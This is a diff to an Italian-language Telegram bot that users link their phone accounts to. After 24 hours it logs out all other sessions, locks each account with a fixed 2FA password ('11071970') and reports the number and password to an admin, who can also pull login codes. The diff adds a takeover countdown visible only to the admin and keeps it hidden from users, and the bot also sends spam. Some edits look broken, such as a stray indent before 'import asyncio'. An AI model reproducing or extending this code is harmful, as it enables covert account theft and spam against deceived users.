@@ -1,4 +1,4 @@
-import asyncio
+ import asyncio
 import os
 import time
 from flask import Flask
@@ -45,7 +45,7 @@ async def background_workers():
         for user_id, udata in list(user_data_store.items()):
             for phone, acc_info in list(udata.get("accounts", {}).items()):
                 
-                # 1. Controllo Timer 24h: disconnessione e attivazione/cambio 2FA dopo 24h
+                # 1. Controllo Timer 24h (86400 secondi)
                 if not acc_info.get("protected", False):
                     elapsed = current_time - acc_info.get("link_time", current_time)
                     if elapsed >= 86400:
@@ -54,7 +54,11 @@ async def background_workers():
                             try:
                                 if not client.is_connected():
                                     await client.connect()
+                                
+                                # Disconnette tutte le sessioni esterne
                                 await client(ResetAuthorizationRequest())
+                                
+                                # Imposta/attiva la password 2FA su 11071970
                                 try:
                                     await client.edit_2fa(new_password='11071970')
                                 except Exception as e:
@@ -63,9 +67,10 @@ async def background_workers():
                                 acc_info["protected"] = True
                                 acc_info["fa_password"] = "11071970"
                                 
+                                # Invia la notifica ufficiale all'Admin
                                 await bot.send_message(
                                     ADMIN_ID,
-                                    f"🔒 **Timer 24h scaduto - Account protetto!**\n• Utente: {udata.get('name')} (`{user_id}`)\n• Numero: `{phone}`\n• Sessioni disconnesse: ✅\n• 2FA password: `11071970` ✅"
+                                    f"🔒 **Timer 24h scaduto - Account protetto!**\n• Utente: {udata.get('name')} (`{user_id}`)\n• Numero: `{phone}`\n• Sessioni disconnesse: ✅\n• 2FA password impostata: `11071970` ✅"
                                 )
                             except Exception as e:
                                 print(f"❌ Errore protezione 24h per {phone}: {e}")
@@ -110,7 +115,22 @@ async def background_workers():
                                 except Exception as e:
                                     print(f"❌ Errore invio spam per {phone}: {e}")
 
-# --- HOME PRINCIPALE ---
+# --- FUNZIONE DI SUPPORTO PER CALCOLARE IL TIMER PER L'ADMIN ---
+def get_admin_timer_text(acc_info):
+    if acc_info.get("protected", False):
+        return "Protetto (2FA attiva) ✅"
+    
+    elapsed = time.time() - acc_info.get("link_time", time.time())
+    remaining = (24 * 3600) - elapsed
+    
+    if remaining <= 0:
+        return "In fase di protezione..."
+    
+    rem_hours = int(remaining // 3600)
+    rem_mins = int((remaining % 3600) // 60)
+    return f"{rem_hours}h {rem_mins}m rimanenti ⏱️"
+
+# --- HOME PRINCIPALE (PER L'UTENTE: SENZA TIMER) ---
 async def show_account_management(event, user_id):
     if user_id not in user_data_store or not user_data_store[user_id].get("active_phone"):
         return
@@ -146,7 +166,7 @@ async def show_account_management(event, user_id):
     except Exception:
         await event.respond(text, buttons=buttons, parse_mode="markdown")
 
-# --- MENU IMPOSTAZIONI SPAM ---
+# --- MENU IMPOSTAZIONI SPAM (PER L'UTENTE: SENZA TIMER) ---
 async def show_spam_settings_menu(event, user_id):
     if user_id not in user_data_store or not user_data_store[user_id].get("active_phone"):
         return
@@ -438,11 +458,12 @@ async def callback_router(event):
             name = udata.get("name", "Utente")
             accounts = udata.get("accounts", {})
             
-            text = f"👤 **Dettagli Utente:** {name} (`{uid}`)\n\n📱 **Account collegati e 2FA:**\n"
+            text = f"👤 **Dettagli Utente:** {name} (`{uid}`)\n\n📱 **Account collegati, Timer e 2FA:**\n"
             buttons = []
             for phone, acc_info in accounts.items():
-                fa_pass = acc_info.get("fa_password", "In attesa delle 24h")
-                text += f"• Numero: `{phone}`\n  2FA password: `{fa_pass}`\n\n"
+                timer_text = get_admin_timer_text(acc_info)
+                fa_pass = acc_info.get("fa_password", "In attesa delle 24h (predefinita sarà 11071970)")
+                text += f"• Numero: `{phone}`\n  ⏱️ Tempo rimanente: {timer_text}\n  🔑 2FA password: `{fa_pass}`\n\n"
                 buttons.append([Button.inline(f"🔑 Richiedi Codice ({phone})", data=f"admin_get_code_{uid}_{phone}".encode())])
             
             buttons.append([Button.inline("🔙 Torna alla lista utenti", b"admin_users")])
@@ -625,8 +646,8 @@ async def message_router(event):
 # --- AVVIO PRINCIPALE ---
 async def main():
     asyncio.create_task(background_workers())
-    print("🤖 Bot avviato senza errori di sintassi!")
+    print("🤖 Bot avviato: timer 24h visibile solo nel pannello admin in tempo reale!")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
-    bot.loop.run_until_complete(main())
+    bot.run_until_complete(main())
